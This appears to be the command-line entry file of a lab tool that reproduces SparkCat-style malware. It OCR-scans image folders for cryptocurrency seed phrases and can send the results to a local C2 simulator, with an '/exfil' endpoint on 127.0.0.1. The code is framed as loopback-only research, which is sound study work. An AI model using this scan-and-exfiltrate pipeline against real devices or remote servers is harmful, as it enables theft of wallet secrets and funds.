"""mnestic CLI:scan(扫描+可选回传)与 c2(本地 C2 模拟器)。

仅限 Ubuntu 本机实验:C2 只绑 127.0.0.1,不做免杀/持久化,不改被扫描目录。
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

from mnestic import __version__
from mnestic.c2 import exfiltrate, start_c2
from mnestic.scan import scan_directory


def _print_findings(findings, *, mask: bool) -> None:
    if not findings:
        print("[mnestic] 未检出助记词")
        return
    for f in findings:
        phrase = f"{f.phrase[:20]}…({f.word_count} 词)" if mask else f.phrase
        flag = "校验和✓" if f.checksum_valid else "校验和✗"
        print(f"[mnestic] 检出 [{flag}] {f.word_count} 词: {phrase}\n          来源: {f.image}")


def cmd_scan(args: argparse.Namespace) -> int:
    findings = scan_directory(args.directory, db_path=args.db)
    _print_findings(findings, mask=args.mask)
    if findings and args.c2:
        result = exfiltrate(args.c2, [f.as_dict() for f in findings])
        print(f"[mnestic] 已回传 {result.get('count', 0)} 条到 C2 {args.c2}")
    return 1 if any(f.checksum_valid for f in findings) else 0


def cmd_c2(args: argparse.Namespace) -> int:
    server = start_c2(port=args.port, db_path=args.db)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[mnestic-c2] 已停止")
    finally:
        server.server_close()
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="mnestic",
        description="SparkCat 式助记词扫描复现(仅本机实验:C2 仅回环、零外联、不改文件)",
    )
    parser.add_argument("--version", action="version", version=f"mnestic {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)

    p_scan = sub.add_parser("scan", help="递归扫描目录中的图片,OCR 检出助记词")
    p_scan.add_argument("directory", type=Path, help="要扫描的图片目录")
    p_scan.add_argument("--db", type=Path, default=Path.home() / ".local/share/mnestic/findings.db",
                        help="审计 sqlite 路径(默认 ~/.local/share/mnestic/findings.db)")
    p_scan.add_argument("--c2", default=None, help="可选:回传到本地 C2(如 http://127.0.0.1:8765/exfil)")
    p_scan.add_argument("--mask", action="store_true", help="输出脱敏(保首尾词)")
    p_scan.set_defaults(func=cmd_scan)

    p_c2 = sub.add_parser("c2", help="启动本地 C2 模拟器(仅绑 127.0.0.1)")
    p_c2.add_argument("--port", type=int, default=8765)
    p_c2.add_argument("--db", type=Path, default=Path.home() / ".local/share/mnestic/c2.db",
                      help="回传入库路径(默认 ~/.local/share/mnestic/c2.db)")
    p_c2.set_defaults(func=cmd_c2)

    args = parser.parse_args(argv)
    try:
        return args.func(args)
    except (NotADirectoryError, RuntimeError) as exc:
        print(f"[mnestic] 错误: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
